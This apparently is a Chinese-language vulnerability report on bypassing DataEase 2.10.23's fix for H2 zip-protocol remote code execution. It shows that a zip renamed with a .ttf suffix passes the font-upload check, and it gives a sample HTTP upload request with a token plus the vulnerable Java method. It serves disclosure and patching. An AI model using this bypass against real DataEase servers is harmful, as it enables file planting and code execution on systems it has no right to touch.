# H2 RCE via Zip Protocol & File Dropper Fix bypass

此漏洞是基于"fix: 【漏洞】Remote Code Execution (RCE) via Zip Protocol & File Dropper https://github.com/dataease/dataease/commit/a7bffa795cb0ca041dce0effe68479cf3bf13db1"的绕过

经过本地测试发现H2 zip协议不限制后缀，只要是zip格式都能正常解压，后缀无限制，于是就有了dataease2.10.23版本的bypass

查看commit发现`io/dataease/datasource/server/DatasourceServer#uploadFile`这个方法增加了后缀白名单

同时，如果上传xlsx后缀的zip文件，ExcelUtils.getTables方法会抛出格式不正确的异常

<img width="1883" height="862" alt="image" src="https://github.com/user-attachments/assets/c26920a6-7560-45a7-b1e6-c5eb05c6aef7" />


因此找到了另一个上传方法`io/dataease/font/manage/FontManage#saveFile`，此方法虽然限制了文件后缀为ttf，但并没有校验文件内容，也不会删除，所以可以上传一个后缀为ttf的zip格式文件。

<img width="1919" height="860" alt="image" src="https://github.com/user-attachments/assets/774e8e54-9787-4b36-a7c5-ef6bae5266b5" />


zip文件改个后缀上传即可

```http
POST /de2api/typeface/uploadFile HTTP/1.1
Host: 192.168.239.138:8100
Content-Length: 1441
Accept-Language: zh-CN
Accept: application/json, text/plain, */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTBXt7gnsZ4zAVkxW
X-DE-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MSwiZXhwIjoxNzgwNTIzODEzfQ.2K6pLNXu_p7ap2WEFbeRBM8lXouh-4JuakVg-Kws1ME
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
Origin: http://192.168.239.138:8100
Referer: http://192.168.239.138:8100/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundaryTBXt7gnsZ4zAVkxW
Content-Disposition: form-data; name="file"; filename="test.mv.ttf"
Content-Type: application/octet-stream

xxxx
------WebKitFormBoundaryTBXt7gnsZ4zAVkxW--
```

拿到文件绝对路径`/opt/dataease2.0/data/font/b397c2fc-4c4c-45ef-82f8-0343561cb949.ttf`后，之后的步骤和https://github.com/dataease/dataease/security/advisories/GHSA-cjmg-jqmc-xj5v 相同

`io/dataease/font/manage/FontManage#saveFile`代码

可以看到`fileOutputStream.write(file.getBytes());`这一步直接写入文件，后续没有任何校验或删除操作

```java
private FontDto saveFile(MultipartFile file, String fileNameUUID) throws DEException {
        FontDto fontDto = new FontDto();
        try {
            String filename = file.getOriginalFilename();
            if (StringUtils.isEmpty(filename) || !filename.toLowerCase().endsWith(".ttf")) {
                DEException.throwException("非法格式的文件！");
            }
            String suffix = filename.substring(filename.lastIndexOf(".") + 1);
            String filePath = path + fileNameUUID + "." + suffix;
            File f = new File(filePath);
            FileOutputStream fileOutputStream = new FileOutputStream(f);
            fileOutputStream.write(file.getBytes());
            fileOutputStream.flush();
            fileOutputStream.close();
            fontDto.setFileTransName(fileNameUUID + "." + suffix);

            long length = file.getSize();
            String unit = "MB";
            Double size = 0.0;
            if ((double) length / 1024 / 1024 > 1) {
                if ((double) length / 1024 / 1024 / 1024 > 1) {
                    unit = "GB";
                    size = Double.valueOf(String.format("%.2f", (double) length / 1024 / 1024 / 1024));
                } else {
                    size = Double.valueOf(String.format("%.2f", (double) length / 1024 / 1024));
                }
            } else {
                unit = "KB";
                size = Double.valueOf(String.format("%.2f", (double) length / 1024));
            }
            Font font = Font.createFont(Font.TRUETYPE_FONT, new File(filePath));
            fontDto.setSize(size);
            fontDto.setSizeType(unit);
            fontDto.setName(font.getFontName());
        } catch (Exception e) {
            DEException.throwException(e);
        }
        return fontDto;
    }
```

